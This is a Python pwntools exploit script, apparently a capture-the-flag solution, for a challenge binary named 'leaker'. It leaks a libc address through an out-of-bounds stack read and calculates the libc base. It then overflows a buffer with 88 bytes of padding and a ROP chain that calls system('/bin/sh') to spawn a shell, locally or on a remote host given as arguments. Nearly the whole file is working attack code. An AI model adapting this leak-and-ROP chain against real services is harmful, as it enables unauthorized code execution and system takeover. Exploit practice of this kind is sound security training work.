#!/usr/bin/env python3






# this idea Was inspired By the Eng.HassanAli,
# Big Thanks to him for helping me fixing the exploit   






from pwn import *

# --- Binary and Libc Configuration ---
exe = './leaker' # some times we need to copy the solver to the chall path
elf = context.binary = ELF(exe, checksec=False)

libc_local_path = '/lib/x86_64-linux-gnu/libc.so.6'
libc_remote_path = './libc.so.6'

libc = ELF(libc_remote_path if args.REMOTE else libc_local_path, checksec=False)
context.log_level = 'debug'


# some times these values change between your local machine and the remote server (docker).

# LOCAL (Kali Linux) Settings
local_oob_index = 9
local_offset = -0x38  # Calculated from your GDB session     p __libc_start_main - leked add  = -56 to --> hex = -38

# REMOTE (Docker) Settings
remote_oob_index = 9    # address of leaked libc on the stack
remote_offset = -0x38   # Standard offset for a return from main() if didnot work try -0x36

# --- Pwntools Template for Starting the Process ---
def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
break *vuln+91
continue
'''.format(**locals())

###########################
# --- Exploit Logic --- #
###########################

# Select the correct index and offset based on the execution mode 
if args.REMOTE:
    log.info("Using REMOTE configuration")
    oob_index = remote_oob_index
    offset_from_symbol = remote_offset
else:
    log.info("Using LOCAL configuration")
    oob_index = local_oob_index
    offset_from_symbol = local_offset

# Start
io = start()

# Step 1: Leak the libc address from the stack
io.sendlineafter(b'> ', str(oob_index).encode())
io.recvuntil(b' = 0x')
leaked_libc_addr = int(io.recvline().strip(), 16)
log.success(f"Leaked a libc address: {hex(leaked_libc_addr)}")

# Step 2: Calculate the libc base address
# print(f"{libc.symbols['__libc_start_main']=}") for testing 
libc.address = leaked_libc_addr - (libc.symbols['__libc_start_main'] + offset_from_symbol)
log.success(f"Calculated libc base: {hex(libc.address)}")

# Step 3: Build the ROP chain
rop = ROP(libc)
rop.raw(rop.find_gadget(['ret'])[0]) # For stack alignment
rop.system(next(libc.search(b'/bin/sh\x00')))

log.info("Constructed ROP chain:\n" + rop.dump())

padding = b'A' *88
payload = padding + rop.chain()

# Step 4: Send the payload and get a shell
io.sendafter(b'data:', payload)  # for the leaker.c change it to '?:\n' insted of 'data:'
io.interactive()
